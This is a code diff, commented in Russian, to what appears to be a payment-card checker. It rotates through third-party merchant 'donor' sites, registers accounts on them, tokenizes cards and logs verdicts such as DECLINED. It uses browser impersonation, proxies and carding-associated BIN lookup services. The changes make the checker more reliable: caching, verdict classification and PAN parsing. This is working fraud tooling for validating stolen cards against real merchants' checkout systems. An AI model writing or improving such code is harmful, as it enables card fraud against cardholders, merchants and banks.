@@ -11,6 +11,7 @@ from curl_cffi.requests import AsyncSession
 
 import gate_client as gc
 import config
+import bin_cache
 
 try:
     from proxy_manager import ProxyPool
@@ -24,6 +25,12 @@ FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"
 
 
 async def bin_lookup(bin_num: str) -> dict:
+    # A1: кэш-сначала — BIN не меняется, второй раз того же BIN'а ходит в сеть
+    # только при пустом кэше. Под кэш не попадают пустые ответы (транзиентные фейлы).
+    return await bin_cache.cached_lookup(bin_num, _bin_lookup_net)
+
+
+async def _bin_lookup_net(bin_num: str) -> dict:
     # binlist -> handyapi -> bins.antipublic.cc (Sprint 5: третий источник),
     # на движке curl_cffi; нормализуем к нижнекейсовому виду.
     async with AsyncSession(impersonate="chrome131", verify=False) as s:
@@ -38,14 +45,20 @@ async def bin_lookup(bin_num: str) -> dict:
                     d = r.json()
                     if pick == "antipublic":
                         c_name = str(d.get("country_name", "")).lower()
+                        a2 = str(d.get("country") or "").upper() or gc._ANTIPUBLIC_A2.get(c_name, "")
                         return {
                             "scheme": d.get("brand"),
                             "type": d.get("type"),
                             "bank": {"name": d.get("bank")},
-                            "country": {"alpha2": gc._ANTIPUBLIC_A2.get(c_name, ""),
+                            "country": {"alpha2": a2,
                                         "name": d.get("country_name")},
                             "level": d.get("level"), "_src": "antipublic",
                         }
+                    if pick == "handyapi":
+                        d = gc._normalize_handyapi_bin(d)
+                    # 200 с пустым/ошибочным телом — не источник, идём дальше
+                    if not gc._bin_response_usable(d):
+                        continue
                     d["_src"] = pick
                     return d
             except Exception:
@@ -182,7 +195,7 @@ def update_gate_health(domain: str, ok: bool, fail_limit: int = 3, latency_ms: i
                 g["last_success_ts"] = int(time.time())
                 kept.append(g)
             else:
-                fc = g.get("fail_count", 0) + 1
+                fc = (g.get("fail_count") or 0) + 1
                 if fc < fail_limit:
                     g["fail_count"] = fc
                     kept.append(g)
@@ -362,7 +375,9 @@ class GateSession:
         if "id" not in tok_data:
             err = tok_data.get("error", {}).get("message", str(tok_data))
             code = tok_data.get("error", {}).get("code", "tokenize_error")
-            return {"card": card_raw, "status": f"DECLINED@{code.upper()}",
+            # вердикт из таксономии config.VERDICTS — сырой DECLINED@CODE
+            # отсутствует в иконках/сводках и ломает статистику
+            return {"card": card_raw, "status": gc.classify_verdict(f"{err} {code}"),
                     "detail": err, "retry_next_gate": False}
 
         pm_id = tok_data["id"]
@@ -500,6 +515,7 @@ async def main():
     try:
         for i, c in enumerate(cards):
             res = None
+            pan6 = gc.extract_pan(c)[:6]  # BIN-ключ из PAN — формат-агностик
             for attempt in range(len(ordered_pool)):
                 gate = ordered_pool[attempt]
                 dom = gate.get("domain") or gate.get("base_url")
@@ -522,7 +538,7 @@ async def main():
                         append_result_log({
                             "ts": datetime.now().isoformat(timespec="seconds"),
                             "card": gc.mask_pan(c),
-                            "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
+                            "bin": bin_summary(bins.get(pan6, {})),
                             "donor": dom,
                             "status": "ERROR",
                             "detail": str(detail)[:200],
@@ -535,14 +551,14 @@ async def main():
                     print(f"    [+] Session opened on {dom} (acct {gs.account_email})", flush=True)
 
                 t0 = time.perf_counter()
-                res = await gs.check_card(c, bin_alpha2=bin_alpha2(bins.get(c.split("|")[0][:6], {})))
+                res = await gs.check_card(c, bin_alpha2=bin_alpha2(bins.get(pan6, {})))
                 latency_ms = int((time.perf_counter() - t0) * 1000)
                 if not custom_donor:
                     update_gate_health(dom, not res.get("retry_next_gate"), latency_ms=latency_ms)
                 append_result_log({
                     "ts": datetime.now().isoformat(timespec="seconds"),
                     "card": gc.mask_pan(res.get("card", c)),
-                    "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
+                    "bin": bin_summary(bins.get(pan6, {})),
                     "donor": dom,
                     "status": res.get("status"),
                     "detail": str(res.get("detail", ""))[:200],
@@ -567,7 +583,7 @@ async def main():
     print("\n" + "=" * 80)
     print("[*] SUMMARY:")
     for r in results:
-        prefix = r["card"].split("|")[0][:6]
+        prefix = gc.extract_pan(r["card"])[:6]
         bs = bin_summary(bins.get(prefix, {}))
         print(f"  {config.icon(r['status'])} {r['status']:16} {r['card']:30} [{bs}] {r['detail']}")
     print(f"[*] Registrations this run: {sessions_opened} for {len(cards)} card(s)")
